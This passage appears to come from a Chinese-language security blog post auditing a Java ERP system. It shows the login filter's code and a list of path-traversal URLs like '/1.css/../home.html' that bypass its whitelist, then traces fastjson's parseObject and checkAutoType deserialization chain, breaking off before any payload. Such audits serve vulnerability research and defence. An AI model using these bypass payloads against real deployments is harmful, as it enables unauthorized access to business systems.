+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">regexPrefix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;^.*&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">regexSuffix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;.*$&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">verify</span><span class="p">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">ignoredList</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">regex</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">ignoredList</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Pattern</span><span class="w"> </span><span class="n">pattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Pattern</span><span class="p">.</span><span class="na">compile</span><span class="p">(</span><span class="n">regexPrefix</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">regex</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">regexSuffix</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Matcher</span><span class="w"> </span><span class="n">matcher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pattern</span><span class="p">.</span><span class="na">matcher</span><span class="p">(</span><span class="n">url</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">matcher</span><span class="p">.</span><span class="na">matches</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>过滤逻辑：</p>
+<ul>
+<li>放行：
+<ul>
+<li>Session 中有 user</li>
+<li>访问 <code>/doc.html</code> <code>/register.html</code> <code>/login.html</code></li>
+<li>ignoredList  静态资源</li>
+<li>allowUrls     /user/login   /user/registerUser    /v2/api-docs</li>
+</ul>
+</li>
+<li>其他全部重定向到 /login.html</li>
+<li>缺陷：
+<ul>
+<li>虽然有白名单，但路径匹配不完整，如果在 url 中构建如：1.css/../index.html  doc.html/../index.html 等，就会绕过</li>
+</ul>
+</li>
+</ul>
+<p><strong>漏洞利用：</strong></p>
+<p>payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">/doc.html/../home.html
+</span></span><span class="line"><span class="cl">/register.html/../home.html
+</span></span><span class="line"><span class="cl">/login.html/../home.html
+</span></span><span class="line"><span class="cl">/1.css/../home.html
+</span></span><span class="line"><span class="cl">/user/login/../../home.html
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349294.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349044.png"></p>
+<p><strong>注意：</strong></p>
+<p>这抓包中有时会抓到这样一行数据： If-Modified-Since: Tue, 05 Jan 2021 22:51:28 GMT</p>
+<p>这是浏览器的本地缓存，如果这个资源自这个时间点之后没有修改，就返回304</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349541.png"></p>
+<p>把这个去掉就可以正常注入了</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349763.png"></p>
+<h2 id="2pomxml---maven-依赖">2、pom.xml - <strong>Maven 依赖</strong><a hidden class="anchor" aria-hidden="true" href="#2pomxml---maven-依赖">#</a></h2>
+<h3 id="21-fastjson-1255-反序列化漏洞">2.1 fastjson-1.2.55-反序列化漏洞<a hidden class="anchor" aria-hidden="true" href="#21-fastjson-1255-反序列化漏洞">#</a></h3>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349971.png"></p>
+<p>入口点：parseObject</p>
+<p>**全局搜索 parseObject **，找一个带有可控变量的点</p>
+<p>找到 src/main/java/com/jsh/erp/utils/StringUtil.java 中有利用点</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349969.png"></p>
+<h4 id="分析链">分析链：<a hidden class="anchor" aria-hidden="true" href="#分析链">#</a></h4>
+<hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getInfo</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">search</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">key</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//返回值初始化为空字符串</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//判断 search 是否为空</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">search</span><span class="o">!=</span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//将 search 解析为 JSONObject</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSONObject</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">search</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//从 JSONObject 取一个 key 并转化为 String</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//如果取到空字符串，value = null;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>跟进 <!-- raw HTML omitted -->JSONObject.parseObject<!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">JSONObject</span><span class="w"> </span><span class="nf">parseObject</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//调用了 parse 方法，把 text 解析成一个 Java 对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parse</span><span class="p">(</span><span class="n">text</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">obj</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">JSONObject</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">JSONObject</span><span class="p">)</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>跟进 <!-- raw HTML omitted -->parse(String text)<!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//调用了另一个 parse</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">parse</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="w"> </span><span class="n">DEFAULT_PARSER_FEATURE</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>跟进 <!-- raw HTML omitted -->parse(String text, int features)<!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">text</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">features</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//引入了 ParserConfig.getGlobalInstance() 方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">parse</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="w"> </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">(),</span><span class="w"> </span><span class="n">features</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>跟进 parse(String text, ParserConfig config, int features)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">text</span><span class="p">,</span><span class="w"> </span><span class="n">ParserConfig</span><span class="w"> </span><span class="n">config</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">features</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">text</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">DefaultJSONParser</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DefaultJSONParser</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="w"> </span><span class="n">config</span><span class="p">,</span><span class="w"> </span><span class="n">features</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//解析 JSON</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parser</span><span class="p">.</span><span class="na">parse</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">parser</span><span class="p">.</span><span class="na">handleResovleTask</span><span class="p">(</span><span class="n">value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">parser</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>跟进 <!-- raw HTML omitted -->DefaultJSONParser<!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="nf">DefaultJSONParser</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">ParserConfig</span><span class="w"> </span><span class="n">config</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">features</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//创建 JSONScanner ，传给下一个核心构造器</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONScanner</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="n">features</span><span class="p">),</span><span class="w"> </span><span class="n">config</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="nf">DefaultJSONParser</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">JSONLexer</span><span class="w"> </span><span class="n">lexer</span><span class="p">,</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">ParserConfig</span><span class="w"> </span><span class="n">config</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//lexer：词法分析器。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">lexer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lexer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//用户输入的 JSON 字符串</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">input</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="na">symbolTable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">symbolTable</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//获取 JSON 输入的第一个字符，用于判断 JSON 的类型：{ 对象；[ 数组；其他（数字、字符串、布尔等）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">ch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lexer</span><span class="p">.</span><span class="na">getCurrent</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ch</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;{&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">lexer</span><span class="p">.</span><span class="na">next</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">((</span><span class="n">JSONLexerBase</span><span class="p">)</span><span class="w"> </span><span class="n">lexer</span><span class="p">).</span><span class="na">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSONToken</span><span class="p">.</span><span class="na">LBRACE</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ch</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;[&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">lexer</span><span class="p">.</span><span class="na">next</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">((</span><span class="n">JSONLexerBase</span><span class="p">)</span><span class="w"> </span><span class="n">lexer</span><span class="p">).</span><span class="na">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSONToken</span><span class="p">.</span><span class="na">LBRACKET</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">lexer</span><span class="p">.</span><span class="na">nextToken</span><span class="p">();</span><span class="w"> </span><span class="c1">// prime the pump</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><blockquote>
+<p><strong><!-- raw HTML omitted -->lexer（词法分析器）与 parser（语法分析器）<!-- raw HTML omitted --></strong></p>
+<p><a href="https://blog.csdn.net/buguge/article/details/147525215"><strong>https://blog.csdn.net/buguge/article/details/147525215</strong></a></p>
+<p><strong><!-- raw HTML omitted -->词法分析器(Lexer)和语法分析器(Parser)<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->是两个核心组件，它们协同工作将原始输入(如JSON字符串、代码文件)转换为结构化数据(如对象、抽象语法树)<!-- raw HTML omitted --></p>
+</blockquote>
+<p>返回一步，Object value = parser.parse();   跟进 parse()</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">parse</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">parse</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">fieldName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">final</span><span class="w"> </span><span class="n">JSONLexer</span><span class="w"> </span><span class="n">lexer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">lexer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">lexer</span><span class="p">.</span><span class="na">token</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="n">LBRACE</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONObject</span><span class="p">(</span><span class="n">lexer</span><span class="p">.</span><span class="na">isEnabled</span><span class="p">(</span><span class="n">Feature</span><span class="p">.</span><span class="na">OrderedField</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">parseObject</span><span class="p">(</span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">fieldName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span></code></pre></div><p>跟进 parseObject</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">parseObject</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">fieldName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span></code></pre></div><p>在这个类中找我们需要的处理 @type 的部分，搜索  checkAutoType</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//JSON.DEFAULT_TYPE_KEY 即 @type</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">key</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">DEFAULT_TYPE_KEY</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">lexer</span><span class="p">.</span><span class="na">isEnabled</span><span class="p">(</span><span class="n">Feature</span><span class="p">.</span><span class="na">DisableSpecialKeyDetect</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">typeName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lexer</span><span class="p">.</span><span class="na">scanSymbol</span><span class="p">(</span><span class="n">symbolTable</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;&#34;&#39;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">checkAutoType</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">lexer</span><span class="p">.</span><span class="na">getFeatures</span><span class="p">());</span><span class="w">
+</span></span></span></code></pre></div><p>跟进 checkAutoType</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">checkAutoType</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">expectClass</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">features</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span></code></pre></div><p>来到这个类中，按照之前版本的经验，下一步有个 <!-- raw HTML omitted -->TypeUtils.loadClass ，继续搜索<!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">autoTypeSupport</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">expectClassFlag</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">h3</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">3</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">className</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hash</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">className</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hash</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="n">PRIME</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Arrays</span><span class="p">.</span><span class="na">binarySearch</span><span class="p">(</span><span class="n">acceptHashCodes</span><span class="p">,</span><span class="w"> </span><span class="n">hash</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
